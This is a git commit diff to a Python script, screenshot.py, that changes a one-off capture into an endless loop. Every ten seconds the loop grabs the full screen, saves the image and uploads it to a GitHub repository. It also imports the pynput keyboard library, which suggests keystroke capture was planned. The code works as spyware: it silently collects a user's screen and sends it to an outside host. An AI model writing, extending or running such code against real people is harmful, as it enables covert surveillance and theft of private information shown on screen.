2a7b486eca3f7b7b9f4e9986fd28b2b7851afdd8
Fleur Van Buiijten <61800948+fighttothesky@users.noreply.github.com>
2023-05-28 10:36:44 +0200

    Update screenshot.py

--- screenshot.py
+++ screenshot.py
@@ -1,6 +1,9 @@
 import pyautogui
 from datetime import datetime
-import os
+import time
+
+from pynput import keyboard
+
 from github_helper import GithubHelper
 from localdata_dir import create_dir
 
@@ -9,20 +12,25 @@ def take_screenshot():
     screenshot = pyautogui.screenshot()
     return screenshot
 
-# screenshot details
-folder_path = create_dir()
-screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
-file_path = f"{folder_path}\\{screenshot_name}"
 
-screenshot = take_screenshot()
-screenshot.save(file_path)
+while True:
+    # screenshot details
+    folder_path = create_dir()
+    screenshot_name = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+    file_path = f"{folder_path}\\{screenshot_name}"
 
-print("Screenshot captured:", screenshot_name)
+    screenshot = take_screenshot()
+    screenshot.save(file_path)
 
-# Read the content of the screenshot file
-with open(file_path, "rb") as file:
-    content = file.read()
+    print("Screenshot captured:", screenshot_name)
 
-# Upload the file to the repository
-github_helper = GithubHelper()
-github_helper.create_file("pythontest", f"{screenshot_name}", "commit message", content)
+    # Read the content of the screenshot file
+    with open(file_path, "rb") as file:
+        content = file.read()
+
+    # Upload the file to the repository
+    github_helper = GithubHelper()
+    github_helper.create_file("pythontest", f"{screenshot_name}", "commit message", content)
+
+    # How often to take screenshots (in seconds)
+    time.sleep(10)
